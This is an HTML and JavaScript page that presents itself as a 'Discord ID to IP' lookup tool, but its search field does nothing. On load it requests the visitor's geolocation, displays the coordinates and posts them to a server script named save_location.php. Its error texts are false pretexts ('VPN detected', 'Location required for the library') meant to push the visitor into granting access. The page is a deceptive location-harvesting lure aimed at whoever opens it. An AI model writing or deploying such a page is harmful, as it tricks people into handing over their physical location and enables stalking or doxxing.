<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord ID2IP</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        #location { font-size: 1.5em; margin-top: 20px; }
        #search-bar { font-size: 1em; padding: 10px; width: 80%; }
    </style>
</head>
<body>
    <h1>Discord ID to IP</h1>
    <input type="text" id="search-bar" placeholder="Discord ID to IP">
    <div id="location"></div>
    <button id="save-btn">Save Location Info</button>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                document.getElementById('location').innerHTML = "Geolocation is not supported by this browser.";
            }
        });

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            document.getElementById('location').innerHTML = `Latitude: ${lat} <br> Longitude: ${lon}`;

            document.getElementById('save-btn').addEventListener('click', () => {
                saveLocation(lat, lon);
            });
        }

        function showError(error) {
            let errorMessage = '';
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = "Location required for the library";
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = "VPN detected";
                    break;
                case error.TIMEOUT:
                    errorMessage = "Please accept it";
                    break;
                case error.UNKNOWN_ERROR:
                    errorMessage = "Error occurred";
                    break;
            }
            document.getElementById('location').innerHTML = errorMessage;
        }

        function saveLocation(lat, lon) {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "save_location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    alert("Location saved successfully!");
                }
            };
            xhr.send("latitude=" + lat + "&longitude=" + lon);
        }
    </script>
</body>
</html>
